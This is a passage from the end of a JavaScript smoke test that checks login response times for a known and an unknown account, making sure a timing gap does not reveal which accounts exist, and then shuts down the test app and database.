    // One warm-up: the first bcrypt call carries native-module setup cost that
    // would otherwise land entirely on whichever path ran first.
    await attempt("warmup@example.org");

    const known = await attempt("admin@example.org");
    const unknown = await attempt("nobody@example.org");

    /*
     * Before the decoy hash, an unknown address returned without touching
     * bcrypt at all — the gap was the whole cost of a hash, and a reliable way
     * to enumerate who holds an account. Asserting the ratio rather than a
     * millisecond figure keeps this meaningful on a slow machine.
     */
    const ratio = Math.max(known, unknown) / Math.max(1, Math.min(known, unknown));
    assert(
      ratio < 3,
      `timing gap reveals which accounts exist: known ${known.toFixed(0)}ms vs unknown ${unknown.toFixed(0)}ms`,
    );
  });

  await app.close();
  await mongo.stop();

  if (failures > 0) {
    console.error(`\n${failures} check(s) failed`);
    process.exit(1);
  }
  console.log("\nAll smoke checks passed ✔");
  process.exit(0);
}

main().catch((error) => {
  console.error("Smoke test crashed:", error);
  process.exit(1);
});
